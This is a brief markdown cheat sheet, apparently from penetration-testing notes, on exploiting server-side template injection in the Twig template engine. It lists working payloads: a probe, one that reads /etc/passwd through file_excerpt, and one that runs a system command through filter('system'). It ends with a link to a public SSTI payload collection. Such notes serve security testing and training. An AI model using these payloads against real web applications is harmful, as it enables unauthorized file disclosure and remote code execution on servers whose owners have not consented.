# Exploiting SSTI - Twig

```twig
{{ _self }}
```

## Local File Inclusion

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

## Remote Code Execution

```twig
{{ ['id'] | filter('system') }}
```

There are also SSTI cheat sheets that bundle payloads for popular template engines, such as the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).

